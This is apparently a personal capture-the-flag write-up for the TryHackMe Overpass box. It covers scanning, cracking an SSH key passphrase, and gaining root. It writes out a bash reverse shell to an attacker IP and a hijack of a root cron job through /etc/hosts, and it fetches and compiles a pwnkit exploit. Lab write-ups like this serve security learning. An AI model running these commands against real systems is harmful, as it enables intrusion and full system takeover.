# Box Name

## OverPass

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
- ## nmap

```bash
                                                                                                                                                                                                                                          
┌──(kn1ght㉿Kali)-[~/THM/Overpass]
└─$ rustscan -a 10.10.251.106 --ulimit 5000 -- -sCV -oN nmap/initial
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.251.106:22
Open 10.10.251.106:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU=
|   256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- ## ferox

```bash
┌──(kn1ght㉿Kali)-[~/THM/Overpass]
└─$ ferox -u http://10.10.251.106 -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt -t 60 -x html,txt,php,js,cgi -C 403,404,301 -o logs/ferox

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.251.106
 🚀  Threads               │ 60
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/raft-small-words.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403, 404, 301]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox
 💲  Extensions            │ [html, txt, php, js, cgi]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
200       26l       54w      782c http://10.10.251.106/404.html
200       53l      195w     2431c http://10.10.251.106/
200       39l      161w     1749c http://10.10.251.106/aboutus/
200       43l      171w     1779c http://10.10.251.106/login.js
200       47l      131w     1987c http://10.10.251.106/downloads/
200        4l        6w       79c http://10.10.251.106/css/
200       40l       93w     1525c http://10.10.251.106/admin.html
200        2l       42w     1502c http://10.10.251.106/cookie.js
200       40l       93w     1525c http://10.10.251.106/admin/
200        4l        6w       95c http://10.10.251.106/downloads/src/
200        7l       12w      243c http://10.10.251.106/downloads/builds/
200        1l        2w       28c http://10.10.251.106/main.js
200        5l        8w      183c http://10.10.251.106/img/
[####################] - 27m   258018/258018  159/s   http://10.10.251.106
```
- ### set cookie on admin login page

![[Pasted image 20220528200908.png]]

- ## refresh page

![[Pasted image 20220528200211.png]]

---
## Initial Foothold
---
- # ssh
	- copy rsa key to local machine 
	- use ssh2john 
	- used jon to crack pass phrase

```bash
                                                         
┌──(kn1ght㉿Kali)-[~/THM/Overpass]
└─$ john --wordlist=/home/scott/rockyou.txt rsa.hash   
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2022-05-28 20:01) 2.941g/s 39341p/s 39341c/s 39341C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

used ssh with rsa key and pass phrase to log on to the box
```bash
                                                                                                                                                                                                                                           
┌──(kn1ght㉿Kali)-[~/THM/Overpass]
└─$ chmod 600 id_rsa   
                                                                                                                                                                                                                                           
┌──(kn1ght㉿Kali)-[~/THM/Overpass]
└─$ ssh -i id_rsa james@10.10.251.106
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 29 01:13:56 UTC 2022

  System load:  0.08               Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 49%                IP address for eth0: 10.10.251.106
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ id;whoami
uid=1001(james) gid=1001(james) groups=1001(james)
james
james@overpass-prod:~$ 
```

---
## Privilege Escalation

- ## crontab
	- ### cat /etc/crontab
```bash
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
james@overpass-prod:~$ 

```

- ### root is running a cron job every minuet
- ### on local machine creat the dir /downloads/src/
	- ### place a bash [[revshell]] shell in a file called buildscript.sh
	- ### start a nc listener
```bash
┌──(kn1ght㉿Kali)-[~/THM/Overpass]
└─$ mkdir downloads/src/       
mkdir: cannot create directory ‘downloads/src/’: No such file or directory
                                                         
┌──(kn1ght㉿Kali)-[~/THM/Overpass]
└─$ mkdir -p downloads/src        
                                                         
┌──(kn1ght㉿Kali)-[~/THM/Overpass]
└─$ cd downloads/src 
                                                         
┌──(kn1ght㉿Kali)-[~/THM/Overpass/downloads/src]
└─$ echo "bash -c 'bash -i >& /dev/tcp/10.13.13.55/1234 0>&1'" > buildscript.sh
                                                         
┌──(kn1ght㉿Kali)-[~/THM/Overpass/downloads/src]
└─$ nc -lnvp 1234
listening on [any] 1234 ...

```


- ### on the remote machine
	- #### edit /etc/host
		- change overpass.thm to my tun0 ip

```bash
127.0.0.1 localhost
127.0.1.1 overpass-prod
#127.0.0.1 overpass.thm
10.13.13.55 overpass.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
~                                                                                                                                                                                           
~                                                                                                                                                                                           
~                                                                                                                                                                                           
~                                                                                                                                                                                           
~                                                                                                                                                                                           
~                                                                                                                                                                                           
~                                                                                                                                                                                           
~                                                                                                                                                                                           
~                                                                                                                                                                                           
~                                                                                                                                                                                           
~                                                                                                                                                                                           
~                                                                                                                                                                                           
-- INSERT --                                                                                                                                                              4,13          All


```

- ### wait for cronjob to run and get a root shell

![[Pasted image 20220528210005.png]]

- ## pwnkit
	- #### uploaded pwnkit.c
	- #### got root
	
```bash
ames@overpass-prod:~$ wget http://10.13.13.55:9001/pwnkit.c
--2022-05-29 01:19:55--  http://10.13.13.55:9001/pwnkit.c
Connecting to 10.13.13.55:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1290 (1.3K) [text/x-csrc]
Saving to: ‘pwnkit.c’

pwnkit.c                                       100%[====================================================================================================>]   1.26K  --.-KB/s    in 0.02s   

2022-05-29 01:19:56 (81.6 KB/s) - ‘pwnkit.c’ saved [1290/1290]

james@overpass-prod:~$ gcc pwnkit.c -o pwn

james@overpass-prod:~$ ./pwn
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@overpass-prod:/home/james# 

```

- ### cat user.txt

```bash
root@overpass-prod:/home/james# cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}

```

- ### cat root.txt
```bash
root@overpass-prod:/home/james# cat /root/root.txt 
thm{7f336f8c359dbac18d54fdd64ea753bb}
root@overpass-prod:/home/james#
```

